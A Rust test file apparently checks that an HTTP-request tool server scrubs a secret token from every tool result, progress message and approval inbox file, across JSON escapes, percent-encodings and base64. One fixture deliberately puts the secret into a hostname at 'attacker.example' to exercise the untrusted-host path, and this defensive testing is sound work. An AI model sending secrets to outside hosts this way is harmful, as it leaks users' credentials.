//! The end-to-end leak test: a secret with a space, a double quote, a slash and a plus is used
//! in a header, a query, basic auth, a host and a Host header; an echoing server returns
//! everything it saw, as text and as JSON;
//! every tool's result, every progress message and every inbox file is searched for the secret
//! in each listed form.

use crate::common;

use base64::Engine;
use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD};
use common::{ROOT, TestServer};
use serde_json::{Value, json};
use url::Url;
use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};

const SECRET: &str = "Le4k \"me\"/now+9";
const DEV: &str =
    "name: dev\nvariables:\n  - name: token\n    secret: true\n  - name: plain\n    value: shown\n";

/// Answers with the request line and every header in the body, every header again as an
/// `x-echo-` response header, and the query string as a cookie.
struct Echo;

impl Respond for Echo {
    fn respond(&self, req: &Request) -> ResponseTemplate {
        let mut body = format!("{} {}\n", req.method, req.url);
        let mut template = ResponseTemplate::new(200);
        for (name, value) in req.headers.iter() {
            body.push_str(&format!(
                "{name}: {}\n",
                String::from_utf8_lossy(value.as_bytes())
            ));
            template = template.append_header(format!("x-echo-{name}").as_str(), value.clone());
        }
        let cookie = format!("q={}; Path=/", req.url.query().unwrap_or(""));
        let template = template.append_header("set-cookie", cookie.as_str());
        // `/json` answers with what it saw as a JSON document, so a quote comes back escaped.
        if req.url.path() == "/json" {
            let seen = json!({"seen": body});
            return template.set_body_raw(seen.to_string(), "application/json");
        }
        template.set_body_string(body)
    }
}

/// Every listed form, plus the JSON escape a serialised result would carry.
fn forms() -> Vec<String> {
    // The secret quoted as a JSON string once, twice and three times: a JSON body inside a
    // result's text is escaped twice.
    let mut escaped = vec![SECRET.to_owned()];
    for depth in 0..3 {
        let json = serde_json::to_string(&escaped[depth]).unwrap();
        escaped.push(json[1..json.len() - 1].to_owned());
    }
    let mut forms = vec![
        escaped[1].clone(),
        escaped[2].clone(),
        escaped[3].clone(),
        SECRET.to_owned(),
        url::form_urlencoded::byte_serialize(SECRET.as_bytes()).collect(),
        SECRET
            .bytes()
            .map(|b| {
                if b.is_ascii_alphanumeric() || b"-_.!~*'()".contains(&b) {
                    (b as char).to_string()
                } else {
                    format!("%{b:02X}")
                }
            })
            .collect(),
    ];
    let mut url = Url::parse("http://h.test/").unwrap();
    url.set_path(SECRET);
    forms.push(url.path()[1..].to_owned());
    url.set_query(Some(SECRET));
    forms.push(url.query().unwrap().to_owned());
    url.set_fragment(Some(SECRET));
    forms.push(url.fragment().unwrap().to_owned());
    url.set_username(SECRET).unwrap();
    forms.push(url.username().to_owned());
    url.set_password(Some(SECRET)).unwrap();
    forms.push(url.password().unwrap().to_owned());
    for engine in [&STANDARD, &STANDARD_NO_PAD, &URL_SAFE, &URL_SAFE_NO_PAD] {
        forms.push(engine.encode(SECRET));
        forms.push(engine.encode(format!("user:{SECRET}")));
    }
    forms
}

/// Every string leaf of `value`, keys included, so escaped and unescaped text are both searched.
fn strings(value: &Value, out: &mut Vec<String>) {
    match value {
        Value::String(s) => out.push(s.clone()),
        Value::Array(items) => items.iter().for_each(|i| strings(i, out)),
        Value::Object(map) => {
            for (k, v) in map {
                out.push(k.clone());
                strings(v, out);
            }
        }
        _ => {}
    }
}

fn request(name: &str, seq: u32, url: &str, extra: &str) -> String {
    format!(
        "info:\n  name: {name}\n  type: http\n  seq: {seq}\nhttp:\n  method: GET\n  url: \"{url}\"\n{extra}"
    )
}

#[tokio::test]
async fn no_tool_output_or_inbox_file_holds_the_secret_in_any_form() {
    let mock = MockServer::start().await;
    Mock::given(wiremock::matchers::any())
        .respond_with(Echo)
        .mount(&mock)
        .await;
    let token = json!({"access_token": SECRET, "token_type": "Bearer", "expires_in": 3600});
    Mock::given(wiremock::matchers::method("POST"))
        .and(wiremock::matchers::path("/token"))
        .respond_with(ResponseTemplate::new(200).set_body_json(token))
        .with_priority(1)
        .expect(1)
        .mount(&mock)
        .await;
    let oauth = format!(
        "  auth:\n    type: oauth2\n    flow: client_credentials\n    accessTokenUrl: \"{}/token\"\n    credentials:\n      clientId: app\n      clientSecret: \"{{{{token}}}}\"\n    tokenConfig:\n      id: main\n",
        mock.uri()
    );
    let used = "  headers:\n    - name: X-Key\n      value: \"{{token}}\"\n  auth:\n    type: basic\n    username: user\n    password: \"{{token}}\"\n";
    let server = TestServer::start(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", DEV),
        (
            "api/echo.yml",
            &request(
                "echo",
                1,
                &format!("{}/e?q={{{{token}}}}", mock.uri()),
                used,
            ),
        ),
        (
            "api/host.yml",
            &request("host", 2, "https://{{token}}.attacker.example/", ""),
        ),
        (
            "api/json.yml",
            &request("json", 4, &format!("{}/json", mock.uri()), used),
        ),
        (
            "front/fronted.yml",
            &request(
                "fronted",
                1,
                &mock.uri(),
                "  headers:\n    - name: Host\n      value: \"{{token}}\"\n",
            ),
        ),
        // Outside the run folders: its client secret is the sweep's secret and the provider
        // issues the secret itself as the token.
        (
            "auth/oauth.yml",
            &request("oauth", 1, &format!("{}/e", mock.uri()), &oauth),
        ),
        (
            "api/away.yml",
            &request("away", 3, "https://api.example.com/{{token}}", used),
        ),
    ])
    .await;
    server.set_secret("dev", "token", SECRET);
    let dev = json!("dev");
    let calls: Vec<(&str, Value)> = vec![
        ("get_collection", json!({})),
        ("list_items", json!({})),
        ("read_request", json!({"path": "api/echo.yml"})),
        ("read_folder", json!({"path": ""})),
        ("read_environment", json!({"name": "dev"})),
        ("list_trusted_hosts", json!({})),
        (
            "send_request",
            json!({"path": "api/echo.yml", "environment": dev}),
        ),
        (
            "send_request",
            json!({"path": "api/host.yml", "environment": dev}),
        ),
        (
            "send_request",
            json!({"path": "api/away.yml", "environment": dev}),
        ),
        (
            "send_request",
            json!({"path": "api/json.yml", "environment": dev}),
        ),
        (
            "send_request",
            json!({"path": "front/fronted.yml", "environment": dev}),
        ),
        ("run_folder", json!({"path": "api", "environment": dev})),
        ("run_folder", json!({"path": "front", "environment": dev})),
        (
            "oauth2_token",
            json!({"path": "auth/oauth.yml", "action": "fetch", "environment": dev}),
        ),
        ("list_cookies", json!({})),
        (
            "update_request",
            json!({"path": "api/echo.yml", "docs": "echoes"}),
        ),
        ("update_folder", json!({"path": "", "docs": "root"})),
        ("create_folder", json!({"parent": "", "name": "more"})),
        (
            "create_request",
            json!({"parent": "more", "name": "n", "url": "http://127.0.0.1:9/"}),
        ),
        ("clone_request", json!({"path": "more/n.yml", "name": "n2"})),
        ("clone_folder", json!({"path": "more", "name": "more copy"})),
        ("rename_item", json!({"path": "more/n2.yml", "name": "n3"})),
        ("move_item", json!({"path": "more/n3.yml", "inside": ""})),
        ("delete_item", json!({"path": "n3.yml"})),
        (
            "update_environment",
            json!({"name": "dev", "set": [{"name": "plain", "value": "shown2"}]}),
        ),
        ("create_environment", json!({"name": "spare"})),
        (
            "rename_environment",
            json!({"from": "spare", "to": "spare2"}),
        ),
        ("delete_environment", json!({"name": "spare2"})),
        ("delete_environment", json!({"name": "dev"})),
        ("clear_cookies", json!({})),
    ];
    let mut seen = Vec::new();
    for (tool, args) in calls {
        let result = server.call(tool, args).await;
        // The token fetch must really succeed, so its reply is searched as a success.
        if tool == "oauth2_token" {
            assert_ne!(result.is_error, Some(true), "{:?}", result.content);
        }
        let serialised = serde_json::to_value(&result).expect("serialises");
        seen.push((tool.to_owned(), serialised.to_string()));
        let mut leaves = Vec::new();
        strings(&serialised, &mut leaves);
        seen.push((tool.to_owned(), leaves.join("\n")));
    }
    for p in server.progress() {
        seen.push(("progress".to_owned(), format!("{:?}", p.message)));
    }
    let inbox = server.inbox();
    let pending = inbox.pending().expect("inbox");
    assert!(!pending.is_empty(), "the untrusted send filed an approval");
    for approval in pending {
        seen.push((
            "inbox".to_owned(),
            std::fs::read_to_string(&approval.file).expect("read"),
        ));
    }
    // The echo really carried the secret, so a clean result means scrubbing worked.
    assert!(!mock.received_requests().await.expect("recorded").is_empty());
    for form in forms() {
        for (source, text) in &seen {
            assert!(
                !text.contains(&form),
                "{source} leaks the form {form:?}: {text}"
            );
        }
    }
}

/// Returns the secrets in the encodings only a deeper scrub catches: JSON inside JSON, a double
/// percent-encoding, a base64 text that holds the secret mid-stream, and a 4 byte secret inside
/// a longer base64 text.
struct Disguised;

const LONG: &str = "Pa\"ss\\w/rd 9";
const SHORT: &str = "Zk3!";

fn disguised_forms() -> Vec<String> {
    let inner = json!({"v": LONG}).to_string();
    let doubly = serde_json::to_string(&inner).unwrap();
    let once = serde_json::to_string(LONG).unwrap();
    // encodeURIComponent applied twice: the `%` of the first pass becomes `%25`.
    let component = |text: &str| -> String {
        text.bytes()
            .map(|b| {
                if b.is_ascii_alphanumeric() || b"-_.!~*'()".contains(&b) {
                    (b as char).to_string()
                } else {
                    format!("%{b:02X}")
                }
            })
            .collect()
    };
    let percent = component(&component(LONG));
    vec![
        once[1..once.len() - 1].to_owned(),
        doubly[1..doubly.len() - 1].to_owned(),
        percent,
        STANDARD_NO_PAD.encode(format!("xQ{LONG}Zy")),
        STANDARD.encode(format!("id=7&key={SHORT}&more=1")),
    ]
}

impl Respond for Disguised {
    fn respond(&self, _: &Request) -> ResponseTemplate {
        let forms = disguised_forms();
        let seen = json!({"nested": json!({"v": LONG}).to_string(), "forms": forms});
        ResponseTemplate::new(200).set_body_raw(seen.to_string(), "application/json")
    }
}

#[tokio::test]
async fn disguised_secret_forms_never_reach_a_tool_result() {
    let mock = MockServer::start().await;
    Mock::given(wiremock::matchers::any())
        .respond_with(Disguised)
        .mount(&mock)
        .await;
    let env = "name: dev\nvariables:\n  - name: token\n    secret: true\n  - name: pin\n    secret: true\n";
    let used = "  headers:\n    - name: X-Key\n      value: \"{{token}}\"\n    - name: X-Pin\n      value: \"{{pin}}\"\n";
    let server = TestServer::start(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", env),
        (
            "api/d.yml",
            &request("d", 1, &format!("{}/d", mock.uri()), used),
        ),
    ])
    .await;
    server.set_secret("dev", "token", LONG);
    server.set_secret("dev", "pin", SHORT);
    let dev = json!("dev");
    let mut seen = Vec::new();
    for (tool, args) in [
        (
            "send_request",
            json!({"path": "api/d.yml", "environment": dev}),
        ),
        ("run_folder", json!({"path": "api", "environment": dev})),
    ] {
        let result = server.call(tool, args).await;
        let serialised = serde_json::to_value(&result).expect("serialises");
        let mut leaves = Vec::new();
        strings(&serialised, &mut leaves);
        seen.push((tool, serialised.to_string()));
        seen.push((tool, leaves.join("\n")));
    }
    assert!(!mock.received_requests().await.expect("recorded").is_empty());
    for form in disguised_forms()
        .iter()
        .map(String::as_str)
        .chain([LONG, SHORT])
    {
        for (source, text) in &seen {
            assert!(!text.contains(form), "{source} leaks {form:?}: {text}");
        }
    }
}
